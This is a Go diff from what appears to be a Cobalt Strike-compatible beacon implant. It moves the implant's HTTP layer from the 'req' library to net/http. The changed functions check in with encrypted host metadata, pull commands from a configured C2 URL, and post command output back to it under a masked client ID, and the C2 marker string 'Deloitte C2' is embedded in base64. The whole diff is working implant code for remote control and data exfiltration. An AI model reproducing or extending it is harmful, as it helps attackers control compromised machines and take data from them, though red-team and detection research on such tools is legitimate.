@@ -15,8 +15,8 @@ import (
 	"strings"
 	"time"
 	"math/rand"
-
-	"github.com/imroc/req"
+	"io/ioutil"
+	"net/http"
 )
 
 var (
@@ -320,7 +320,8 @@ func FirstBlood() bool {
 		resp := HttpGet(config.GetUrl, encryptedMetaInfo)
 		if resp != nil {
 			fmt.Printf("firstblood: %v\n", resp)
-			fmt.Printf("firstblood body: %x\n", resp.Bytes())
+			body, _ := ioutil.ReadAll(resp.Body)
+			fmt.Printf("firstblood body: %x\n", body)
 			break
 		}
 		time.Sleep(500 * time.Millisecond)
@@ -329,56 +330,46 @@ func FirstBlood() bool {
 	return true
 }
 
-func PullCommand() *req.Resp {
+func PullCommand() *http.Response {
 	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedMetaInfo)
 	resp := HttpGet(config.GetUrl, encryptedMetaInfo)
-	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
+	// fmt.Printf("pullcommand: %v\n", resp.Request().URL)
+	fmt.Printf("pullcommand: %v\n", resp.Request.URL)
 	fmt.Printf("%v \n", resp)
 	return resp
 }
 
-func PullChainCommand(encryptedChainMetaInfo []byte) *req.Resp {
+func PullChainCommand(encryptedChainMetaInfo []byte) *http.Response {
 	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedChainMetaInfo)
 	resp := HttpGet(config.GetUrl, string(EncryptPacket(encryptedChainMetaInfo)))
-	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
+	// fmt.Printf("pullcommand: %v\n", resp.Request().URL)
+	fmt.Printf("pullcommand: %v\n", resp.Request.URL)
 	fmt.Printf("%v \n", resp)
 	return resp
 }
 
-func PushResult(b []byte) *req.Resp {
+func PushResult(b []byte) *http.Response {
 	// url := config.PostUrl + strconv.Itoa(clientID)
 	maskedClientID := mask([]byte(strconv.Itoa(clientID)))
 	base64ClientID := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(maskedClientID)
 	url := config.PostUrl + string(base64ClientID) + "RGVsb2l0dGUgQzIK"
 	resp := HttpPost(url, b)
-	fmt.Printf("pushresult: %v\n", resp.Request().URL)
+	fmt.Printf("pushresult: %v\n", resp.Request.URL)
 	return resp
 }
 
 // old idea, that was stupid in hindsight: create a new push request for each beacon that we link to
 // new idea, is CS implements it: create one request for push, combine all output slices
 // as all output slices are prepended by their length, we can just concat them to one big slice, and CS will handle the output accordingly
-func PushChainResult(chainClientId int, b []byte) *req.Resp {
+func PushChainResult(chainClientId int, b []byte) *http.Response {
 	// url := config.PostUrl + strconv.Itoa(clientID)
 	maskedClientID := mask([]byte(strconv.Itoa(chainClientId)))
 	base64ClientID := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(maskedClientID)
 	url := config.PostUrl + string(base64ClientID) + "RGVsb2l0dGUgQzIK"
 	resp := HttpPost(url, b)
-	fmt.Printf("pushresult: %v\n", resp.Request().URL)
+	fmt.Printf("pushresult: %v\n", resp.Request.URL)
 	return resp
 }
-
-/*
-func processError(err string) {
-	errIdBytes := WriteInt(0) // must be zero
-	arg1Bytes := WriteInt(0)  // for debug
-	arg2Bytes := WriteInt(0)
-	errMsgBytes := []byte(err)
-	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-	finalPaket := MakePacket(31, result)
-	PushResult(finalPaket)
-}
-*/
 
 func mask(b []byte) []byte {
 	key := make([]byte, 4)
